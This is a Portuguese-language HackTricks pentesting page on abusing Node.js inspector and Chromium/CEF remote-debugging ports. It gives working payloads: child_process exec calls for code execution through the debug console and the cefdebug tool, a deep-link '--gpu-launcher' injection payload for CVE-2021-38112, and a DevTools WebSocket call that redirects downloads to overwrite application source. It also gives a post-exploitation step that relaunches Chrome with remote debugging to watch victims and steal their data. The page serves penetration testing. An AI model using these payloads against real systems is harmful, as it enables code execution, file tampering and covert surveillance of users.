# Node inspector/CEF debug abuso

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Você trabalha em uma **empresa de segurança cibernética**? Você quer ver sua **empresa anunciada no HackTricks**? ou você quer ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe suas técnicas de hacking enviando PRs para o** [**repositório hacktricks**](https://github.com/carlospolop/hacktricks) **e** [**repositório hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Informações básicas

Quando iniciado com o parâmetro `--inspect`, um processo Node.js aguarda um cliente de depuração. Por **padrão**, ele aguardará no host e porta **`127.0.0.1:9229`**. Cada processo também é atribuído um **UUID** **único**.

Os clientes do Inspector devem conhecer e especificar o endereço do host, a porta e o UUID para se conectar. Uma URL completa será algo como `ws://127.0.0.1:9229/0f2c936f-b1cd-4ac9-aab3-f63b0f33d55e`.

{% hint style="warning" %}
Como o **depurador tem acesso total ao ambiente de execução do Node.js**, um ator malicioso capaz de se conectar a esta porta pode ser capaz de executar código arbitrário em nome do processo Node.js (**possível escalonamento de privilégios**).
{% endhint %}

Existem várias maneiras de iniciar um inspector:
```bash
node --inspect app.js #Will run the inspector in port 9229
node --inspect=4444 app.js #Will run the inspector in port 4444
node --inspect=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
node --inspect-brk=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
# --inspect-brk is equivalent to --inspect

node --inspect --inspect-port=0 app.js #Will run the inspector in a random port
# Note that using "--inspect-port" without "--inspect" or "--inspect-brk" won't run the inspector
```
Quando você inicia um processo inspecionado, algo como isso aparecerá:
```
Debugger ending on ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
For help, see: https://nodejs.org/en/docs/inspector
```
Processos baseados em **CEF** (**Chromium Embedded Framework**) como precisam usar o parâmetro: `--remote-debugging-port=9222` para abrir o **depurador** (as proteções SSRF permanecem muito semelhantes). No entanto, em vez de conceder uma sessão de **depuração** do **NodeJS**, eles se comunicarão com o navegador usando o [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/), que é uma interface para controlar o navegador, mas não há um RCE direto.

Quando você inicia um navegador depurado, algo como isso aparecerá:
```
DevTools listening on ws://127.0.0.1:9222/devtools/browser/7d7aa9d9-7c61-4114-b4c6-fcf5c35b4369
```
### Navegadores, WebSockets e política de mesma origem <a href="#browsers-websockets-and-same-origin-policy" id="browsers-websockets-and-same-origin-policy"></a>

Os sites abertos em um navegador da web podem fazer solicitações WebSocket e HTTP sob o modelo de segurança do navegador. Uma **conexão HTTP inicial** é necessária para **obter um ID de sessão de depurador exclusivo**. A **política de mesma origem** **impede** que os sites possam fazer **essa conexão HTTP**. Para segurança adicional contra [**ataques de rebinding DNS**](https://en.wikipedia.org/wiki/DNS\_rebinding)**,** o Node.js verifica se os cabeçalhos **'Host'** para a conexão especificam um **endereço IP** ou **`localhost`** ou **`localhost6`** precisamente.

{% hint style="info" %}
Essas **medidas de segurança impedem a exploração do inspetor** para executar código **apenas enviando uma solicitação HTTP** (o que poderia ser feito explorando uma vulnerabilidade SSRF).
{% endhint %}

### Iniciando o inspetor em processos em execução

Você pode enviar o **sinal SIGUSR1** para um processo nodejs em execução para fazer com que ele **inicie o inspetor** na porta padrão. No entanto, observe que você precisa ter privilégios suficientes, portanto, isso pode conceder a você **acesso privilegiado a informações dentro do processo**, mas não uma escalada direta de privilégios.
```bash
kill -s SIGUSR1 <nodejs-ps>
# After an URL to access the debugger will appear. e.g. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
```
{% hint style="info" %}
Isso é útil em containers porque **desligar o processo e iniciar um novo** com `--inspect` não é uma opção porque o **container** será **encerrado** com o processo.
{% endhint %}

### Conectar ao inspetor/debugger

Se você tiver acesso a um navegador **baseado em Chromium**, você pode se conectar acessando `chrome://inspect` ou `edge://inspect` no Edge. Clique no botão Configure e verifique se o seu **host e porta de destino** estão listados (veja um exemplo na imagem a seguir de como obter RCE usando um dos exemplos das próximas seções).

![](<../../.gitbook/assets/image (620) (1).png>)

Usando a **linha de comando**, você pode se conectar a um debugger/inspector com:
```bash
node inspect <ip>:<port>
node inspect 127.0.0.1:9229
# RCE example from debug console
debug> exec("process.mainModule.require('child_process').exec('/Applications/iTerm.app/Contents/MacOS/iTerm2')")
```
A ferramenta [**https://github.com/taviso/cefdebug**](https://github.com/taviso/cefdebug) permite **encontrar inspetores** em execução localmente e **injetar código** neles.
```bash
#List possible vulnerable sockets
./cefdebug.exe
#Check if possibly vulnerable
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.version"
#Exploit it
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.mainModule.require('child_process').exec('calc')"
```
{% hint style="info" %}
Observe que **as explorações de RCE do NodeJS não funcionarão** se conectadas a um navegador via [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/) (você precisa verificar a API para encontrar coisas interessantes para fazer com ela).
{% endhint %}

## RCE no Depurador/Inspector do NodeJS

{% hint style="info" %}
Se você veio aqui procurando como obter [**RCE a partir de um XSS no Electron, por favor, verifique esta página.**](../../network-services-pentesting/pentesting-web/electron-desktop-apps/)
{% endhint %}

Algumas maneiras comuns de obter **RCE** quando você pode **conectar** a um **inspector** do Node são usando algo como (parece que isso **não funcionará em uma conexão com o protocolo Chrome DevTools**):
```javascript
process.mainModule.require('child_process').exec('calc')
window.appshell.app.openURLInDefaultBrowser("c:/windows/system32/calc.exe")
require('child_process').spawnSync('calc.exe')
Browser.open(JSON.stringify({url: "c:\\windows\\system32\\calc.exe"}))
```
## Cargas do Protocolo Chrome DevTools

Você pode verificar a API aqui: [https://chromedevtools.github.io/devtools-protocol/](https://chromedevtools.github.io/devtools-protocol/)\
Nesta seção, vou apenas listar coisas interessantes que as pessoas têm usado para explorar esse protocolo.

### Injeção de Parâmetros via Deep Links

No [**CVE-2021-38112**](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/), a Rhino Security descobriu que um aplicativo baseado em CEF **registrou um URI personalizado** no sistema (workspaces://) que recebia o URI completo e, em seguida, **iniciava o aplicativo baseado em CEF** com uma configuração parcialmente construída a partir desse URI.

Foi descoberto que os parâmetros do URI eram decodificados de URL e usados para iniciar o aplicativo básico do CEF, permitindo que um usuário **injete** a flag **`--gpu-launcher`** na **linha de comando** e execute coisas arbitrárias.

Portanto, uma carga útil como:
```
workspaces://anything%20--gpu-launcher=%22calc.exe%22@REGISTRATION_CODE
```
Vamos executar o calc.exe.

### Sobrescrever Arquivos

Altere a pasta onde os **arquivos baixados serão salvos** e faça o download de um arquivo para **sobrescrever** o **código-fonte** frequentemente utilizado do aplicativo com o seu **código malicioso**.
```javascript
ws = new WebSocket(url); //URL of the chrome devtools service
ws.send(JSON.stringify({
id: 42069,
method: 'Browser.setDownloadBehavior',
params: {
behavior: 'allow',
downloadPath: '/code/'
}
}));
```
### RCE e exfiltração usando Webdriver

De acordo com este post: [https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148](https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148), é possível obter RCE e exfiltrar páginas internas usando o theriver.

### Pós-Exploração

Em um ambiente real e **após comprometer** um PC de usuário que utiliza um navegador baseado no Chrome/Chromium, você pode iniciar um processo do Chrome com o **debugging ativado e encaminhar a porta de depuração**, para que você possa acessá-lo. Dessa forma, você será capaz de **inspecionar tudo o que a vítima faz com o Chrome e roubar informações sensíveis**.

A maneira furtiva é **encerrar todos os processos do Chrome** e, em seguida, chamar algo como
```bash
Start-Process "Chrome" "--remote-debugging-port=9222 --restore-last-session"
```
## Referências

* [https://www.youtube.com/watch?v=iwR746pfTEc\&t=6345s](https://www.youtube.com/watch?v=iwR746pfTEc\&t=6345s)
* [https://github.com/taviso/cefdebug](https://github.com/taviso/cefdebug)
* [https://iwantmore.pizza/posts/cve-2019-1414.html](https://iwantmore.pizza/posts/cve-2019-1414.html)
* [https://bugs.chromium.org/p/project-zero/issues/detail?id=773](https://bugs.chromium.org/p/project-zero/issues/detail?id=773)
* [https://bugs.chromium.org/p/project-zero/issues/detail?id=1742](https://bugs.chromium.org/p/project-zero/issues/detail?id=1742)
* [https://bugs.chromium.org/p/project-zero/issues/detail?id=1944](https://bugs.chromium.org/p/project-zero/issues/detail?id=1944)
* [https://nodejs.org/en/docs/guides/debugging-getting-started/](https://nodejs.org/en/docs/guides/debugging-getting-started/)
* [https://chromedevtools.github.io/devtools-protocol/](https://chromedevtools.github.io/devtools-protocol/)
* [https://larry.science/post/corctf-2021/#saasme-2-solves](https://larry.science/post/corctf-2021/#saasme-2-solves)
* [https://embracethered.com/blog/posts/2020/chrome-spy-remote-control/](https://embracethered.com/blog/posts/2020/chrome-spy-remote-control/)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Você trabalha em uma **empresa de segurança cibernética**? Gostaria de ver sua **empresa anunciada no HackTricks**? Ou gostaria de ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo Telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe seus truques de hacking enviando PRs para o** [**repositório hacktricks**](https://github.com/carlospolop/hacktricks) **e para o** [**repositório hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
